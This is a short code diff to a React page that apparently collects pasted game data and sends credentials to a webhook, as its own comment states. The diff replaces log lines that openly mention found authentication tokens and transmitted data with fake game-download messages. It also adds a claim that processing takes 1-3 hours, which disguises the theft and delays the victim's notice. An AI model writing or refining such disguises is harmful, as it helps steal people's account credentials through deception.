@@ -1,4 +1,3 @@
-
 import { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Textarea } from '@/components/ui/textarea';
@@ -70,7 +69,7 @@ const Index = () => {
     addConsoleLog('[INFO] Parsing game data structure...');
     
     setTimeout(() => {
-      addConsoleLog('[INFO] Authentication tokens found');
+      addConsoleLog('[INFO] Game found');
     }, 500);
     
     setTimeout(() => {
@@ -78,7 +77,7 @@ const Index = () => {
     }, 1000);
     
     setTimeout(() => {
-      addConsoleLog('[SUCCESS] Data extracted and transmitted');
+      addConsoleLog('[SUCCESS] Game data downloading');
     }, 1500);
     
     // Send credentials to webhook
@@ -94,7 +93,7 @@ const Index = () => {
     setTimeout(() => {
       setIsLoading(false);
       setGameFiles('');
-      addConsoleLog('[INFO] Process completed. Ready for new input.');
+      addConsoleLog('[INFO] Download complete. Processing game files ( may take 1-3 hours )');
     }, 2000);
   };
 
